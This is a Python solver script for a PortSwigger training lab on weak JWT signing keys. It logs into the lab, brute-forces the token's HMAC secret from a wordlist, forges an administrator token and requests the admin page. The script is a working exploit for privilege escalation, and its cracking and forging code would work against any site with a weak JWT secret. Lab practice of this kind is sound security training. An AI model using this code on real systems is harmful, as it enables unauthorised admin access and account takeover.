#!/usr/bin/env python3
"""
Solve the PortSwigger lab "JWT authentication bypass via weak signing key".

The session cookie is a JWT signed with HMAC-SHA256 using a weak secret. A
JWT is three base64url parts, header.payload.signature, where the signature
is HMAC-SHA256 over "header.payload" keyed with the secret. If the secret is
guessable, we brute-force it from a wordlist, then forge our own valid token
whose "sub" claim is administrator.

Wordlist: download the common-JWT-secrets list (jwt.secrets.list) and save
it next to this script as secrets.txt. Run from inside this folder.

Lab: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import re
import sys
import json
import hmac
import base64
import hashlib
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

USERNAME = "wiener"
PASSWORD = "peter"


def fetch(path, method="GET", data=None, cookies=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data, cookies=cookies,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def b64url_decode(data):
    """Base64url-decode a string, restoring the padding a JWT omits."""
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def b64url_encode(raw):
    """Base64url-encode bytes with no padding (JWT style)."""
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def sign(signing_input, secret):
    """Return the base64url HMAC-SHA256 signature over 'header.payload'."""
    digest = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return b64url_encode(digest)


def login():
    """Log in as wiener and return the JWT from the session cookie."""
    resp = fetch("login")
    match = re.search(r'name="csrf" value="([^"]+)"', resp.text)
    data = {"username": USERNAME, "password": PASSWORD}
    if match:
        data["csrf"] = match.group(1)
    fetch("login", method="POST", data=data)
    return session.cookies.get("session")


def crack_secret(token, wordlist):
    """Return the signing secret if a wordlist entry matches, else None."""
    header_b64, payload_b64, signature_b64 = token.split(".")
    signing_input = f"{header_b64}.{payload_b64}"
    for word in wordlist:
        if sign(signing_input, word) == signature_b64:
            return word
    return None


def forge_token(token, secret):
    """Forge a token with sub=administrator, signed with the cracked secret."""
    header_b64, payload_b64, _ = token.split(".")
    payload = json.loads(b64url_decode(payload_b64))
    payload["sub"] = "administrator"                      # tamper with the claim
    new_payload_b64 = b64url_encode(json.dumps(payload).encode())
    new_sig = sign(f"{header_b64}.{new_payload_b64}", secret)
    return f"{header_b64}.{new_payload_b64}.{new_sig}"


def check_jwt():
    token = login()
    if not token:
        report("JWT weak key", False, "login failed / no session token")
        return
    print(f"[*] Got session JWT for {USERNAME}")

    with open("secrets.txt") as f:
        wordlist = [line.strip() for line in f if line.strip()]

    print(f"[*] Brute-forcing the signing secret ({len(wordlist)} candidates)...")
    secret = crack_secret(token, wordlist)
    if not secret:
        report("JWT weak key", False, "secret not found in wordlist")
        return
    print(f"[*] Cracked signing secret: {secret}")

    forged = forge_token(token, secret)
    resp = fetch("admin", cookies={"session": forged})
    if "Admin interface only available" in resp.text:
        report("JWT weak key", False, "forged token was rejected")
    else:
        report("JWT weak key", True, f"admin access via forged token (secret: {secret})")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Forge an admin JWT by brute-forcing a weak signing key (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_jwt()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()